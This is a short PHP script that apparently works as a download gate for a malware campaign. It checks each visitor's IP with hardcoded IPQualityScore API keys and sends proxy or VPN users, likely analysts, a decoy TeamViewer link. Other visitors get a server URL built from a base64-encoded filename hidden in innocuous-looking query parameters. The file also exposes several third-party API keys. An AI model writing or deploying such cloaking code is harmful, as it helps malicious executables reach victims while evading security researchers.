<?php
$keys = array("19aco2KFj1BaokuLsiEbNonNvmzloW7z","C24cHEpMt1lfbLp0bVVjSC9mMx4I0Dbr","qVBLoIpvNQP9vaLoVrEEIRCa9JDFF4iZ","f7blPXLooZ7Qd9lJNsfonJDsm7LEkuEj","6LmYZsaVgeYfweBGgQnRhUdU2zLEiE99" , "fOKXxZXdLGZgPg0hZwKtiLa6NWgY9Gy4","a48SChUPoVFZWaKtm3aadJOXEAzXHTQm");
$selectedkey = $keys[mt_rand(0, count($keys) - 1)];
$ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : $_SERVER['HTTP_CLIENT_IP'];
    $strictness = 1;
    $result = json_decode(file_get_contents(sprintf('https://ipqualityscore.com/api/json/ip/%s/%s?strictness=%s', $selectedkey, $ip, $strictness)), true);
    if($result !== null){
        if(isset($result['proxy']) && $result['proxy'] == true){
		echo "https://dl.teamviewer.com/download/version_15x/TeamViewer_Setup.exe";
		exit;
        }}
if (isset($_GET["phpid"])) {$extensiontype = $_GET["phpid"];} 
if (isset($_GET["fileid"])) {$extensiontype = $_GET["fileid"];} 
if (isset($_GET["executable"])) {$extensiontype = $_GET["executable"];} 
if (isset($_GET["filename"])) {$extensiontype = $_GET["filename"];} 
if (isset($_GET["imagepath"])) {$extensiontype = $_GET["imagepath"];} 
if (isset($_GET["version"])) {$extensiontype = $_GET["version"];} 
if (isset($_GET["number"])) {$extensiontype = $_GET["number"];} 
if (isset($_GET["date"])) {$extensiontype = $_GET["date"];} 
if (isset($_GET["password"])) {$extensiontype = $_GET["password"];} 




$filename = base64_decode($extensiontype);
$servip = $_SERVER['SERVER_ADDR'];
echo "http://$servip/$filename";
    	exit;
        	echo "http://" . $_SERVER['SERVER_ADDR'] . "/download/fichier.exe";

?>